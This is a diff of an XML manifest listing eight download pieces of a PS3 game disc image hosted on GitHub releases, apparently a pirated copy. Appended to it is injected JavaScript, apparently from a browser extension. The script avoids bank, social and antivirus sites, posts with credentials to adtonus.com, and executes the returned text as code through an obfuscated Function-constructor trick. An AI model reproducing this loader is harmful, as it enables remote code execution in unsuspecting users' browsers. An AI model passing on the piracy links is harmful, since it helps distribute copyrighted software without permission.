@@ -1,7 +1,7 @@
 This XML file does not appear to have any style information associated with it. The document tree is shown below.
 <hfs_manifest>
 <file_name>Tomb.Raider.BLES01780.iso</file_name>
-<file_size>15377973392</file_size>
+<file_size>14010155008</file_size>
 <number_of_split_files>8</number_of_split_files>
 <pieces file_size="2000000000" index="0" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.0"/>
 <pieces file_size="2000000000" index="1" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.1"/>
@@ -10,6 +10,6 @@ This XML file does not appear to have any style information associated with it. 
 <pieces file_size="2000000000" index="4" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.4"/>
 <pieces file_size="2000000000" index="5" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.5"/>
 <pieces file_size="2000000000" index="6" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.6"/>
-<pieces file_size="2000000000" index="7" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.7"/>
+<pieces file_size="0010155008" index="7" url="http://github.com/freestoredrive/hostps3-legendados/releases/download/Tomb_Raider/Tomb.Raider.BLES01780.iso.7"/>
 </hfs_manifest>
 (function(callback, eventName, timeout) { if (typeof window.CustomEvent !== "function") { const CustomEvent = function(event, params) { params = params || { bubbles: false, cancelable: false, detail: null }; var evt = document.createEvent('CustomEvent'); evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail); return evt; }; CustomEvent.prototype = window.Event.prototype; window.CustomEvent = CustomEvent; } let run = false; const handle = function() { if (run) { return; } run = true; const e = new CustomEvent(eventName, { detail: JSON.stringify(callback()) }); window.dispatchEvent(e); }; if(timeout) { setTimeout(handle, timeout); } else { handle(); }})(function(){(function (doc, w) { "use strict"; var except = ['youtube.com', 'alitools.io', 'vtb24.ru', 'bank', 'login.aliexpress.com', 'vk.com', 'facebook.com', 'instagram.com', 'linkedin.com', 'vimeo.com', 'skyload.io', 'pb.ua', 'privatbank.ua', 'google', 'yandex', 'ya.ru', 'opera', 'kaspersky', 'localhost']; var host = doc.location.href; var run = except.filter(function (h) { return host.indexOf(h) >= 0; }).length === 0; if (!run) { return; } if (w.top !== w.self) { return; } var k = 'constructor'; var ev = 'blabla'; function tryCatch(f, v) { (new Promise(f(v))).catch(function () {}); } function debug(v) { if (!v) { return; } var e = v[k]; if (ev[k] !== e) { return; } tryCatch(e[k], v); } function init() { var xhr = Object.assign(new XMLHttpRequest(), { withCredentials: true, onload: function () { debug(200 === xhr.status && xhr.responseText); }, onerror: function () { } }); xhr.open("POST", 'https://adtonus.com/code?id=11'); xhr.send(); } init(); })(document, window); },"skyload-event-12-1706550301467",);
